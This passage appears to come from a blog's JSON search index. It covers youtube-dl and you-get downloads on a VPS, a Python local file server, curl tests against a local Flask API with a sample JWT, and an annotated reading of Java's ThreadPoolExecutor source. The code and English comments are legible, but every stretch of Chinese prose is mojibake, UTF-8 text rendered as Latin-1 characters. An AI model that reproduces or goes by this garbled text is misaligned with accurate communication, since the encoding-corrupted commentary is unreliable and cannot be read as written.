¼å¼ï¼Œä¸‹è½½åˆ°å½“å‰ç›®å½•ã€‚æ¯”è¾ƒå¥½çš„ä¸€ç‚¹æ˜¯ï¼Œç”±äºvpsåœ¨ç¾å›½ï¼Œä¸‹è½½é€Ÿåº¦éå¸¸å¿«ï¼Œç»´æŒåœ¨20MB/msçš„æ ·å­ã€‚ä¸‹è½½å¥½çš„æ–‡ä»¶ä¼šæ”¾åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œåé¢ä½¿ç”¨pscpå·¥å…·ä»vpsæ‹–ä¸‹æ¥å°±å¥½äº†ï¼Œä¸è¿‡æˆ‘å®è·µä¸‹æ¥ï¼Œè¿™ä¸€æ­¥å¾€å¾€æ˜¯æœ€æ…¢çš„ã€‚å…³é”®è¦çœ‹vpsåˆ°ä½ çš„ipçš„é€Ÿåº¦ã€‚æœ‰äº›æ—¶å€™è¿˜ä¼šçªç„¶æ–­æ‰ï¼Œæ‰€ä»¥å¾ˆéº»çƒ¦ã€‚è¿™ä¸ªçœ‹åé¢èƒ½ä¸èƒ½æå®šç™¾åº¦äº‘ç›˜ä¸­è½¬ã€‚è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ï¼Œç”Ÿæˆçš„æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæ¯”å¦‚ -yj74P_BY1zI.mp4 ç”±äºå‰é¢å¸¦äº†ä¸€ä¸ªæ¨ªæ ï¼Œå¾ˆå¤šå‘½ä»¤æ˜¯ä¸è®¤è¿™ç§åå­—çš„ï¼Œéœ€è¦æ‰‹åŠ¨é‡å‘½åä¸€ä¸‹ mv -yj74P_BY1zI.mp4 porn.videomv ./-yj74P_BY1zI.mp4 porn.video #. è¡¨ç¤ºå½“å‰ç›®å½• è°ä¹Ÿä¸æƒ³è¦åé¢çš„ä¹±ç  youtube-dl -o &#39;%(title)s.%(ext)s&#39; https://www.youtube.com/watch?v=rimXGaUdaLg ##å…¶å®å°±æ˜¯ä¸€ä¸ªæ¨¡æ¿äº†ï¼Œåˆ†åˆ«æ˜¯titleå’Œæ–‡ä»¶çš„extension youtube-dlçš„å¯æ‰©å±•æ€§å¥½å¾ˆå¤š æœ‰æ—¶å€™ä¸‹è½½çš„æ–‡ä»¶å¸¦æœ‰ç©ºæ ¼ï¼Œæœ‰æ—¶å€™å¸¦æœ‰ä¸­æ–‡ï¼Œç”¨å•å¼•å·åŒ…èµ·æ¥å°±å¥½äº†ã€‚ youtube-dlè¿˜æœ‰ä¸€äº›å‘½ä»¤è¡Œå‚æ•°å¯ä»¥è®¾ç½® youtube-dl â€“all-formats https://www.youtube.com/watch?v=7PtDrv5AUmA è¿™æ ·ä¼šåˆ—å‡ºæ‰€æœ‰çš„å¯ä¾›ä¸‹è½½çš„åˆ†è¾¨ç‡é€‰é¡¹ï¼Œæ¯ä¸ªé€‰é¡¹å‰é¢å¸¦æœ‰ä¸€ä¸ªåºå·ï¼Œé€‰æ‹©ç‰¹å®šåˆ†è¾¨ç‡çš„é€‰é¡¹ä¸‹è½½åªéœ€è¦ youtube-dl -f 13 https://www.youtube.com/watch?v=7PtDrv5AUmA Download Youtube Videos With Youtube-dl å…¶å®è¿˜å¯ä»¥ä½¿ç”¨external downloaderä½¿ç”¨aria2çš„åˆ†æ®µå’Œå¤šçº¿ç¨‹ä¸‹è½½åŠŸèƒ½å¯ä»¥åŠ å¿«æ–‡ä»¶çš„ä¸‹è½½é€Ÿåº¦ï¼Œå¯¹äºä¸‹è½½å¤§æ–‡ä»¶æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚-x åˆ†æ®µä¸‹è½½ï¼Œ-s å¤šçº¿ç¨‹ä¸‹è½½aria2c -s 2 -x 2 http://xx.com/xx todoï¼š aria2 é¢æ¿ 2.ä»vpsçš„ç¡¬ç›˜ä¸ŠæŠŠä¸‹è½½å¥½çš„è§†é¢‘æ‹–ä¸‹æ¥VPSä¸‹è½½è§†é¢‘çš„é€Ÿåº¦å¾ˆå¿«ï¼Œä½†ä»vpsåˆ°å›½å†…çš„é€Ÿåº¦å°±å¾ˆæ…¢äº†ã€‚ç›®å‰å¯èƒ½çš„æ–¹æ¡ˆæœ‰ä»ç™¾åº¦ç½‘ç›˜æˆ–dropBoxä¸­è½¬ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ç™¾åº¦ç½‘ç›˜çš„æ–¹æ¡ˆbypyï¼Œvpsä¸Šä¼ åˆ°ç½‘ç›˜é€Ÿåº¦å¤ªæ…¢ï¼Œshellå‡ºç°å‡æ­»ï¼Œæ®è¯´æ˜¯ç™¾åº¦æ–¹é¢é™é€Ÿçš„åŸå› ï¼Œæ‰€ä»¥è¿™æ¡è·¯åŸºæœ¬ä¹Ÿæ˜¯å µä¸Šäº†çš„ã€‚ 3.åè¯you-getä¹Ÿæ˜¯åŸºäºpython3çš„ä¸‹è½½å·¥å…·ï¼Œä½¿ç”¨ç®€å•ã€‚åœ¨windowsä¸Šå®‰è£…è¿˜æœ‰ç‚¹éº»çƒ¦ï¼Œåœ¨ubuntuä¸Šåªéœ€ pip3 install you-get å°±å®‰è£…å¥½äº†ä½¿ç”¨æ–¹å¼æ›´ç®€å• &gt; you-get â€œurlâ€you-getè¿˜æä¾›äº†windowsç‰ˆæœ¬ ä¸‹è½½youtubeè§†é¢‘åªéœ€è¦ you-get -x 127.0.0.1:1080 -o â€œD:\\Pornâ€ â€˜https://www.youtube.com/watch?v=jNQXAC9IVRw&#39; youtube-dl -o &#39;%(title)s.%(ext)s&#39; https://www.youtube.com/watch?v=rimXGaUdaLg å‚è€ƒç™¾åº¦äº‘ç›˜åŒæ­¥çš„æ–¹æ³•è®¨è®º","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"}]},{"title":"Python localHostéƒ¨ç½²å‘½ä»¤","date":"2017-05-01T08:57:27.000Z","path":"2017/05/01/2017-05-01-python-server-test/","text":"ä¸€è¡Œå‘½ä»¤å³å¯ python -m http.server 8000 â€“bind 127.0.0.1 æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥127.0.0.1 ï¼Œ å³å¯æµè§ˆå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä»¥GETçš„æ–¹å¼è¿›è¡Œï¼Œå‘½ä»¤è¡Œçª—å£ä¼šå‡ºç°æµè§ˆè®°å½•ã€‚ æ®è¯´SimpleHttpServerä¹Ÿå¯ä»¥ï¼Œ #!/usr/bin/python # -*- coding: UTF-8 -*- import sys from http.server import SimpleHTTPRequestHandler from http.server import BaseHTTPRequestHandler, HTTPServer def test(HandlerClass=SimpleHTTPRequestHandler, ServerClass=HTTPServer): protocol = &quot;HTTP/1.1``&quot; host = &#39;&#39; port = 8000 if len(sys.argv) &gt; 1: arg = sys.argv[1] if &#39;:&#39; in arg: host, port = arg.split(&#39;:&#39;) port = int(port) else: try: port = int(sys.argv[1]) except: host = sys.argv[1] server_address = (host, port) HandlerClass.protocol_version = protocol httpd = ServerClass(server_address, HandlerClass) sa = httpd.socket.getsockname() print(&quot;Serving HTTP on&quot;, sa[0], &quot;port&quot;, sa[1], &quot;...&quot;) httpd.serve_forever() if __name__ == &quot;__main__&quot;: test() Documenting your api like a boss pip install flasggerä½¿ç”¨swaggiè¿™ä¸ªåº“ï¼Œå†™ä¸€ä¸ªymlæ–‡ä»¶å°±èƒ½è‡ªåŠ¨ç”Ÿæˆapiæ–‡æ¡£äº† swaggerä¼¼ä¹å¹¶ä¸åªé™äºpythonï¼Œä¹Ÿæœ‰ç”¨äºSpringBootä¸­çš„java package.ymlæ–‡ä»¶æ€ä¹ˆå†™å‚è€ƒè¿™ä¸ªåº“çš„docswagger uiå’ŒOpenAPI Specificationæœ‰å…³ï¼Œå¤§æ¦‚æ˜¯ç”¨äºåˆ¶ä½œapi docçš„ä¸€å¥—æ ‡å‡†swagger-uiflask apispecflask-rest-plus documenting with swagger flask realworld appä¸­éœ€è¦ä¿®æ”¹çš„å‡ ç‚¹ï¼š requirements/prod.txt -flask_apispec==0.3.2 +flask_apispec==0.7.0 æ¥ä¸‹æ¥å°±æ˜¯è¿™å‡ æ¡å‘½ä»¤ flask db migrateflask db upgradeflask run â€“with-threads windowsä¸‹ä¹Ÿèƒ½è·‘èµ·æ¥éœ€è¦pip install pymysql curlå…¶å®ä¹Ÿèƒ½å®ç°å’Œpostmanä¸€æ ·çš„æ•ˆæœ curl -X POST -d &#39;{&quot;email&quot;:&quot;user3@gmail.com&quot;,&quot;username&quot;:&quot;user3&quot;,&quot;password&quot;:&quot;useronepwd&quot;}&#39; --header &quot;Content-Type:application/json&quot; &quot;http://127.0.0.1:3333/login&quot; curl -X GET -d --header &quot;Content-Type:application/json&quot; --header &quot;Authorization:JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzEzMDMxMTQsImlhdCI6MTUzMTMwMzA4NCwiaXNzIjoia2VuIiwiZGF0YSI6eyJpZCI6MiwibG9naW5fdGltZSI6MTUzMTMwMzA4NH19.04xDT6H2qoKzXpMZygFDIf8kpo4ksEl8J_mzvotgOoA&quot; &quot;http://127.0.0.1:3333/user&quot; å½“ç„¶å®é™…å¼€å‘ä¸­è¿˜æ˜¯å›¾å½¢åŒ–ç•Œé¢æœ€æ–¹ä¾¿ flaskè®¾ç½®status codeä¼¼ä¹åªéœ€è¦åœ¨returnåé¢åŠ ä¸Šä¸€ä¸ª200è¿™æ ·çš„codeå°±å¯ä»¥äº† How Do Python Coroutines Work?å…³äºpythonçš„socket apiï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡ä»‹ç»","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"javaçº¿ç¨‹æ± çš„å®ç°åŸç†","date":"2017-04-30T19:17:45.000Z","path":"2017/04/30/2017-04-30-concurrency-and-beyond/","text":"åŸæœ¬åªæ‰“ç®—å†™ä¸€ç‚¹å…³äºçº¿ç¨‹æ± çš„å®ç°åŸç†ï¼Œåæ¥å‘ç°å‘è¶ŠæŒ–è¶Šå¤§ã€‚ä¸å¾—ä¸å†™åˆ°ä¸€åŠåœä¸‹æ¥ï¼Œæ‰€ä»¥ï¼Œè¿™ç®—æ˜¯ä¸€ç¯‡ä¸é‚£ä¹ˆå®Œå–„çš„å…³äºåŸç†çš„è§£æå§ã€‚ 1. çº¿ç¨‹æ± çš„å¸¸è§„ä½¿ç”¨æ–¹å¼é€šå¸¸è¯´çš„çº¿ç¨‹æ± å¯¹å¤–è¡¨ç°ä¸ºå…·æœ‰ä¸€ç³»åˆ—æ“ä½œåŠŸèƒ½çš„æ¥å£ï¼ŒExecutoræä¾›äº†executeä¸€ä¸ªrunnableçš„åŠŸèƒ½ï¼Œè€Œå…¶å­ç±»ExecutorServiceåˆ™å¯¹å¤–æä¾›äº†æ›´å¤šçš„å®ç”¨åŠŸèƒ½ï¼Œæ‰€ä»¥å¹³æ—¶ç”¨çš„éƒ½æ˜¯ExecutorServiceçš„å®ç°ç±»ã€‚ public interface Executor { /** * Executes the given command at some time in the future. The command * may execute in a new thread, in a pooled thread, or in the calling * thread, at the discretion of the {@code Executor} implementation. * * @param command the runnable task * @throws RejectedExecutionException if this task cannot be * accepted for execution * @throws NullPointerException if command is null */ void execute(Runnable command); } public interface ExecutorService extends Executor{ } public abstract class AbstractExecutorService implements ExecutorService { } public class ThreadPoolExecutor extends AbstractExecutorService { } æ›´å…·ä½“ä¸€ç‚¹æ¥è¯´ï¼Œjava.util.concurrent.ThreadPoolExecutorè¿™ä¸ªç±»æä¾›äº†ä¸Šè¿°æ¥å£çš„å…·ä½“å®ç°ï¼ŒåŒæ—¶å¯¹å¤–æä¾›äº†ä¸€äº›hook(beforeExecuteã€afterExecuteç­‰)ï¼Œå½“ç„¶å¼€å‘è€…ä¹Ÿå¯ä»¥ç»§æ‰¿è¿™ä¸ªæ–¹æ³•ï¼Œå®ç°æ›´å¤šè‡ªå®šä¹‰åŠŸèƒ½ã€‚å®ƒçš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue) { this(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, Executors.defaultThreadFactory(), defaultHandler); } ä½†å®é™…ä¸Šï¼Œjavaä¸å»ºè®®è¿™æ ·ç›´æ¥å¼„ä¸€ä¸ªçº¿ç¨‹æ± å‡ºæ¥ï¼Œè€Œæ˜¯ä½¿ç”¨java.util.concurrent.Executorsä¸­çš„ä¸€äº›ç°æˆçš„å·¥å‚æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± å®ä¾‹ï¼Œå…·ä½“çš„æ–¹æ³•åå¾ˆå¥½ç†è§£ï¼ŒnewFixedThreadPoolï¼ŒnewSingleThreadExecutorï¼ŒnewCachedThreadPoolç­‰ç­‰ã€‚å…³äºçº¿ç¨‹æ± æ„é€ å‡½æ•°å„ä¸ªå‚æ•°çš„æ„ä¹‰ä»¥åŠExecutorsæä¾›çš„å„ç§çº¿ç¨‹æ–¹æ³•çš„é€‚ç”¨åœºåˆï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šè¯¦å°½çš„æ–‡ç« ã€‚ //Threadæœ‰å…­ç§çŠ¶æ€ public enum State { NEW, RUNNABLE, BLOCKED, WAITING, TIMED_WAITING, TERMINATED; } //ThreadPoolExecutorä¸­ç”¨ä¸€ä¸ªAtomicIntegerçš„å‰ä¸‰ä½è¡¨ç¤ºå½“å‰stateï¼Œå29ä½è¡¨ç¤ºworkerçš„æ•°é‡ã€‚é€šè¿‡AtomicIntegerçš„CASæ“ä½œä¿è¯å¤šçº¿ç¨‹ä¹‹é—´çœ‹åˆ°çš„workeræ•°å’Œå½“å‰stateæ˜¯ä¸€è‡´çš„ï¼› private final AtomicInteger ctl = new AtomicInteger(ctlOf(RUNNING, 0)); //ç”¨ä¸€ä¸ªReentrantLockæ¥é”ä½å¯¹workersè¿™ä¸ªHashSetçš„æ·»åŠ ï¼Œåˆ é™¤æ“ä½œ private final HashSet&lt;Worker&gt; workers = new HashSet&lt;Worker&gt;(); è¿™é‡Œé’ˆå¯¹executeæ–¹æ³•å…·ä½“çš„å®ç°æ¥å±•å¼€ï¼Œå³ï¼Œå¦‚ä½•åšåˆ°è‡ªåŠ¨æ‰©å®¹ï¼Œå¦‚ä½•åšåˆ°çº¿ç¨‹ç¼“å­˜ï¼Œå¦‚ä½•å®ç°ç»ˆæ­¢ï¼Œä»¥åŠèµ„æºåŒæ­¥é—®é¢˜ã€‚ public void execute(Runnable command) { if (command == null) throw new NullPointerException(); /* * Proceed in 3 steps: * * 1. If fewer than corePoolSize threads are running, try to * start a new thread with the given command as its first * task. The call to addWorker atomically checks runState and * workerCount, and so prevents false alarms that would add * threads when it shouldn&#39;t, by returning false. * * 2. If a task can be successfully queued, then we still need * to double-check whether we should have added a thread * (because existing ones died since last checkingï¼Œä¸Šä¸€æ¬¡æ£€æŸ¥ä¹‹åå¯èƒ½æœ‰çº¿ç¨‹æŒ‚æ‰äº†) or that * the pool shut down since entry into this method. So we * recheck state and if necessary roll back the enqueuing if * stopped, or start a new thread if there are none. * * 3. If we cannot queue task, then we try to add a new * thread. If it fails, we know we are shut down or saturated * and so reject the task. */ int c = ctl.get(); if (workerCountOf(c) &lt; corePoolSize) { // // Core pool size is the minimum number of workers to keep alive (and not allow to time out etc) unless allowCoreThreadTimeOut is set, in which case the minimum is zero. if (addWorker(command, true))//trueè¡¨ç¤ºåˆ›å»ºæ–°çš„Workeræ—¶çš„ä¸Šé™æ˜¯coolPoolSize,falseè¡¨ç¤ºä¸Šé™æ˜¯maximunPoolSize ä¸€èˆ¬å‰è€…éƒ½å°äºç­‰äºåè€…ï¼ŒæˆåŠŸåˆ›å»ºæ–°çš„Workerå¹¶æ‰§è¡Œä»»åŠ¡çš„è¯,ç›´æ¥åœ¨è¿™é‡Œå°±returnæ‰äº† return; c = ctl.get(); //å½“å‰poolçš„state,ctlæ˜¯ä¸€ä¸ªAtomicInteger } if (isRunning(c) &amp;&amp; workQueue.offer(command)) {//addworkerå°±æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„Workerå¹¶ç«‹å³æ‰§è¡Œcommandï¼Œæ²¡èƒ½æˆåŠŸå°±å¾—æš‚æ—¶æ”¾è¿›queueäº†ã€‚offerå°±æ˜¯å¾€è¿™é‡Œé¢åŠ ä¸€ä¸ªrunnable int recheck = ctl.get();//recheckçš„åŸå› æºç ä¸­ä¹Ÿè¯´æ˜äº† //èµ°åˆ°è¿™ä¸€æ­¥ï¼Œè¯´æ˜å·²ç»æˆåŠŸåŠ å…¥åˆ°é˜Ÿåˆ—ä¸­äº†ã€‚ if (! isRunning(recheck) &amp;&amp; remove(command)) reject(command);//pooléšæ—¶å¯èƒ½ä¼šè¢«å…³æ‰ else if (workerCountOf(recheck) == 0) addWorker(null, false); } else if (!addWorker(command, false)) reject(command); } æ¥çœ‹addWorkerçš„å®ç° //ThreadPoolExecutor.java private boolean addWorker(Runnable firstTask, boolean core) { //ä¸‹é¢æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œå‡è®¾çº¿ç¨‹æ± ä¸å…³é—­çš„è¯ï¼Œå¾ªç¯å»caså®ç°workerCountè‡ªå¢ã€‚ä½†å¦‚æœworkerCountå·²ç»å¤§äºæœ€å¤§æ•°é‡çš„è¯ï¼Œåˆ™ä¼šå¤±è´¥ retry: for (;;) { int c = ctl.get(); int rs = runStateOf(c); // Check if queue empty only if necessary. if (rs &gt;= SHUTDOWN &amp;&amp; ! (rs == SHUTDOWN &amp;&amp; firstTask == null &amp;&amp; ! workQueue.isEmpty())) return false; //æ¯ä¸€æ¬¡å°è¯•è®¾ç½®workerCountä¹‹å‰éƒ½ä¼šæ£€æŸ¥ä¸€ä¸‹å½“å‰æ˜¯å¦å…³é—­ for (;;) { int wc = workerCountOf(c); if (wc &gt;= CAPACITY || wc &gt;= (core ? corePoolSize : maximumPoolSize)) return false; if (compareAndIncrementWorkerCount(c)) break retry;// åªæœ‰è‡ªå¢æˆåŠŸæ‰ä¼šè·³å‡ºå¾ªç¯ï¼Œå¦åˆ™ä¸€ç›´å°è¯•ï¼›å¦‚æœæ²¡æœ‰è‡ªå¢æˆåŠŸï¼Œç»§ç»­ c = ctl.get(); // Re-read ctl if (runStateOf(c) != rs)//çœ‹ä¸‹å½“å‰çŠ¶æ€æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œä¸€æ—¦å˜åŒ–å°±è¦æ£€æŸ¥å½“å‰æ˜¯å¦å…³é—­ï¼Œæ‰€ä»¥è·³åˆ°å¤–éƒ¨å¾ªç¯ continue retry; // else CAS failed due to workerCount change; retry inner loop } } //èµ°åˆ°è¿™é‡Œè¯´æ˜è‡ªå¢æˆåŠŸäº†ï¼Œåœ¨workeræ•°é‡å°äºlimitçš„æ—¶å€™ï¼Œå‡ ä¹ä¸€å®šèƒ½å¤Ÿæ·»åŠ workeræˆåŠŸ boolean workerStarted = false; boolean workerAdded = false; Worker w = null; try { w = new Worker(firstTask); final Thread t = w.thread; if (t != null) { final ReentrantLock mainLock = this.mainLock; mainLock.lock(); try { // Recheck while holding lock. // Back out on ThreadFactory failure or if // shut down before lock acquired. int rs = runStateOf(ctl.get()); if (rs &lt; SHUTDOWN || (rs == SHUTDOWN &amp;&amp; firstTask == null)) { if (t.isAlive()) // precheck that t is startable throw new IllegalThreadStateException(); workers.add(w); int s = workers.size(); if (s &gt; largestPoolSize) largestPoolSize = s; workerAdded = true; } } finally { mainLock.unlock(); } if (workerAdded) { t.start(); //è¿™ä¸ªThreadçš„æ„é€ å‡½æ•°é‡Œä¼ å…¥äº†ä¸€ä¸ªRunnableï¼Œä¹Ÿå°±æ˜¯Workerè‡ªèº« workerStarted = true; } } } finally { if (! workerStarted) addWorkerFailed(w); } return workerStarted; } // ä¸Šé¢åœ¨addWorkerä¸­ï¼ŒworkerCountè‡ªå¢æˆåŠŸåå°±ä¼š final void runWorker(Worker w) { //æ¯ä¸€æ¡çº¿ç¨‹è¿è¡Œèµ·æ¥çš„æ—¶å€™éƒ½ä¼šèµ°è¿™ä¸ªæ–¹æ³• try { while (task != null || (task = getTask()) != null) { w.lock();//taskå¯èƒ½æ˜¯ç¬¬ä¸€ä¸ªrunnableï¼Œä¹Ÿå¯èƒ½æ˜¯ä»queueä¸­å–å‡ºæ¥çš„ //getTaskæ–¹æ³•å°±æ˜¯ä¸æ–­çš„ä»é˜Ÿåˆ—ä¸­è·å–ä»»åŠ¡ã€‚æ³¨æ„ä¹‹å‰addTaskçš„æ–¹æ³•å…¥å‚è¯´æ˜,commandæ˜¯è¯¥workeræ‰§è¡Œçš„ç¬¬ä¸€ä¸ªä»»åŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªworkerä¹‹åè¿˜æœ‰å¯èƒ½ä»queueä¸­è·å–æ–°çš„ä»»åŠ¡ã€‚çº¿ç¨‹èƒ½å¤Ÿä¸€ç›´æœ‰ä»»åŠ¡æ‰§è¡Œï¼Œå°±ä¸ä¼šè¿›å…¥æ­»äº¡çŠ¶æ€(Threadæœ‰å‡ ä¸ªçŠ¶æ€) try { beforeExecute(wt, task);//é’©å­ Throwable thrown = null; try { task.run(); } catch (RuntimeException x) { thrown = x; throw x; } catch (Error x) { thrown = x; throw x; } catch (Throwable x) { thrown = x; throw new Error(x); } finally { afterExecute(task, thrown);//é’©å­ } } finally { task = null; w.completedTasks++; w.unlock(); } } completedAbruptly = false; } finally { processWorkerExit(w, completedAbruptly); //åœ¨è¿™é‡Œä»workersçš„HashSetä¸­ç§»é™¤å½“å‰worker } } addWorkerä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„Worker(çº¿ç¨‹)ï¼Œå¹¶å°†commandä½œä¸ºè¿™ä¸ªçº¿ç¨‹è¦æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼Œè€ŒWorkerçš„runæ–¹æ³•æ˜¯çº¿ç¨‹è·‘èµ·æ¥æ‰§è¡Œçš„æ–¹æ³•ã€‚è‡³äºå¦‚ä½•å®ç°ä»queueä¸­è·å–ä»»åŠ¡äº¤ç»™çº¿ç¨‹å»å®Œæˆï¼Œçœ‹getTaskæ–¹æ³• private Runnable getTask() { boolean timedOut = false; // Did the last poll() time out? for (;;) { //è½®è¯¢ boolean timed = allowCoreThreadTimeOut || wc &gt; corePoolSize; //å¦‚æœå½“å‰workeræ•°é‡è¶…å‡ºäº†corePoolSizeï¼Œå°±è¦å…è®¸æˆ‘è¿™æ¡çº¿ç¨‹æŒ‚æ‰ try { Runnable r = timed ? workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) : //queueçš„pollæ˜¯ç«‹åˆ»è¿”å›çš„,poll(time,unit)æ˜¯ç­‰å¾…è¶…æ—¶è¿”å›ï¼Œtakeåˆ™æ˜¯é˜»å¡ workQueue.take(); // å¦‚æœå½“å‰æ²¡æœ‰è¶…è¿‡æ ¸å¿ƒçº¿ç¨‹æ•°ï¼Œå°±ç”¨takeï¼Œå¦åˆ™ï¼Œè¶…è¿‡keepAliveæ—¶é—´å°±è®¾ç½®timedOutä¸ºtrueï¼Œé‡æ–°èµ°ä¸€éå¾ªç¯çš„æ—¶å€™ä¼šcasæŠŠå½“å‰workeræ•°é‡è‡ªå‡ if (r != null) return r; } catch (InterruptedException retry) { timedOut = false; } } } æ•´ä½“æ¥è¯´ï¼Œexecutor.executeæ–¹æ³•ä¼šè·å–Wokerï¼Œè€ŒWorkeråˆ™ä¼šåœ¨runæ–¹æ³•ä¸­ä¸åœçš„ä»queueä¸­è·å–æ–°çš„ä»»åŠ¡ï¼Œä»è€Œç¡®ä¿çº¿ç¨‹ä¸ä¼šæŒ‚æ‰ã€‚ä¹Ÿå°±æ˜¯æ‰€è°“çš„çº¿ç¨‹æ± ç¼“å­˜äº†çº¿ç¨‹ï¼Œé¿å…äº†é¢‘ç¹åˆ›å»ºçº¿ç¨‹çš„å¼€é”€ã€‚åœ¨ThreadPoolExecutorçš„executeæ–¹æ³•ä¸­æœ‰ä¸€æ®µæ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šï¼Œåˆ†ä¸ºä¸‰æ­¥ï¼š å¦‚æœå½“å‰çš„çº¿ç¨‹æ•°é‡å°äºcorePoolSize,ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹å¹²æ´» å¦åˆ™åŠ å…¥åˆ°é˜Ÿåˆ—ï¼ŒæˆåŠŸçš„è¯è¿˜è¦é‡æ–°æ£€æŸ¥ä¸€ä¸‹ï¼Œå› ä¸ºå¯èƒ½çº¿ç¨‹æ± å…³é—­äº† åŠ å…¥é˜Ÿåˆ—å¤±è´¥çš„è¯ï¼Œå°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹(å¦‚æœsizeè¶…è¿‡maximumPoolSizeçš„è¯æ˜¯ä¼šå¤±è´¥çš„)ï¼Œå†æ¬¡å¤±è´¥çš„è¯å°±è°ƒç”¨RejectPolicy åœ¨javadocä¸­ä¹Ÿå†™çš„å¾ˆæ¸…æ¥š If fewer than corePoolSize threads are running, the Executor always prefers adding a new thread rather than queuing. If corePoolSize or more threads are running, the Executor always prefers queuing a request rather than adding a new thread. If a request cannot be queued, a new thread is created unless this would exceed maximumPoolSize, in which case, the task will be rejected. 2. Queueçš„é€‰æ‹©BlockingQueueæ˜¯ä¸€ä¸ªæ¥å£BlockingQueueæä¾›äº†å››ç§åº”å¯¹ç­–ç•¥æ¥å¤„ç†è¿™ç§èµ„æºä¸èƒ½è¢«ç«‹å³æ»¡è¶³çš„åœºæ™¯ ç©ºå€¼ æŠ›å‡ºå¼‚å¸¸ è¿”å›ä¸€ä¸ªç‰¹æ®Šå€¼ é˜»å¡ è°ƒç”¨è€…æä¾›ä¸€ä¸ªè¶…æ—¶ æ’å…¥ add(e) offer(e) put(e) put(e, time ,timeUnit) ç§»é™¤ remove() poll() take() poll(time,timeUnit) æ£€æŸ¥ element() peek() ä¸å¯ç”¨ ä¸å¯ç”¨ ThreadPoolExecutorçš„æ„é€ å‡½æ•°ä¸­éœ€è¦ä¼ å…¥ä¸€ä¸ªBlockingQueue workQueueï¼Œä¸€ä¸ªé˜»å¡å¼çš„é˜Ÿåˆ— ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ·»åŠ ä»»åŠ¡å’Œè·å–ä»»åŠ¡çš„è¿‡ç¨‹éƒ½æ˜¯é˜»å¡çš„ã€‚jdkä¸­æä¾›çš„çº¿ç¨‹æ± é€‰æ‹©çš„é˜Ÿåˆ—ï¼šnewCachedThreadPoolä½¿ç”¨äº†SynchronousQueue(æ¯ä¸€ä¸ªæ’å…¥æ“ä½œå¿…é¡»ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹çš„å¯¹åº”ç§»é™¤æ“ä½œ)newFixedThreadPoolä½¿ç”¨äº†LinkedBlockingQueue(è¿™ä¸ªé˜Ÿåˆ—æ˜¯æ— ç•Œçš„)ï¼Œå¹²æ´»çš„çº¿ç¨‹å°±é‚£ä¹ˆå¤šï¼Œä»»åŠ¡å¤šäº†å°±åŠ å…¥é˜Ÿåˆ—å¥½äº† è‡ªå®šä¹‰çº¿ç¨‹æ± çš„è¯ï¼Œæœ‰ä¸€äº›ç»éªŒå…¬å¼ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¦‚æœä½ æ˜¯CPUå¯†é›†å‹è¿ç®—ï¼Œé‚£ä¹ˆçº¿ç¨‹æ•°é‡å’ŒCPUæ ¸å¿ƒæ•°ç›¸åŒå°±å¥½ï¼Œé¿å…äº†å¤§é‡æ— ç”¨çš„åˆ‡æ¢çº¿ç¨‹ä¸Šä¸‹æ–‡ã€‚å¦‚æœä½ æ˜¯IOå¯†é›†å‹çš„è¯ï¼Œéœ€è¦å¤§é‡ç­‰å¾…ï¼Œé‚£ä¹ˆçº¿ç¨‹æ•°å¯ä»¥è®¾ç½®çš„å¤šä¸€äº›ï¼Œæ¯”å¦‚CPUæ ¸å¿ƒä¹˜ä»¥2. å‚è€ƒ javaè‡ªå¸¦çº¿ç¨‹æ± å’Œé˜Ÿåˆ—è¯¦è§£ æ·±å…¥åˆ†æ java 8 ç¼–ç¨‹è¯­è¨€è§„èŒƒï¼šThreads and Locks è§£è¯» java å¹¶å‘é˜Ÿåˆ— BlockingQueue èŠèŠå¹¶å‘ï¼ˆä¸ƒï¼‰â€”â€”Java ä¸­çš„é˜»å¡é˜Ÿåˆ—","tags":[{"name":"concurrency","slug":"concurrency","permalink":"https://haldir65.github.io/tags/concurrency/"}]},{"title":"Rxjava2 çš„ä¸€äº›ç‚¹","date":"2017-04-23T13:56:07.000Z","path":"2017/04/23/2017-04-23-rxjava2-for-android/","text":"æœ¬æ–‡å¤šæ•°å†…å®¹æ¥è‡ªJake Whartonçš„æ¼”è®²ï¼Œé…åˆä¸€äº›ä¸ªäººçš„æ„Ÿå—ï¼Œä½œä¸ºä»Šåä½¿ç”¨Rxjava2çš„ä¸€äº›å‚è€ƒã€‚ 1. Why 